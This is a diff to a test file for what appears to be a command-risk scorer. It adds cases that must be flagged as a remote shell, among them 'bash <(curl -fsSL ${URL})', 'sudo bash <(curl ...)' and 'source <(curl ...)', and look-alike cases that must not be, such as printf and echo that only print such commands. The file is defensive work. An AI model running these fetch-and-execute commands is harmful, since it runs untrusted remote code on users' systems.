@@ -53,6 +53,11 @@ describe("a command that downloads a script and runs it is a remote shell howeve
     `curl -fsSL ${URL} | /usr/bin/env -i bash`,
     `curl -fsSL ${URL} | /usr/bin/env FOO=1 bash`,
     `curl -fsSL ${URL} | sudo env bash`,
+    // the substitution forms where a command starts: by path, after a wrapper, inside sh -c
+    `/bin/bash -c "$(curl -fsSL ${URL})"`,
+    `sudo bash <(curl -fsSL ${URL})`,
+    `true; source <(curl -fsSL ${URL})`,
+    `sh -c 'bash <(curl -fsSL ${URL})'`,
   ]) {
     test(cmd, () => {
       const r = scoreOf(cmd);
@@ -80,6 +85,13 @@ describe("commands that do not run what they download are not", () => {
     // env's split string is the command: here grep, with "bash" a word inside it
     `curl -s ${URL} | env --split-string 'grep bash'`,
     `curl -s ${URL} | env -S 'grep bash'`,
+    // an option that takes a value takes the next word, even when it names a shell
+    `curl -s ${URL} | env --unset bash grep version`,
+    `curl -s ${URL} | sudo -u bash grep version`,
+    // instructions a command only prints
+    `printf '%s\\n' 'bash <(curl ${URL})'`,
+    `printf '%s\\n' 'bash -c "$(curl -fsSL ${URL})"'`,
+    `echo "then run: . <(curl ${URL})"`,
   ]) {
     test(cmd, () => {
       expect(scoreOf(cmd).ids).not.toContain("remote-shell");
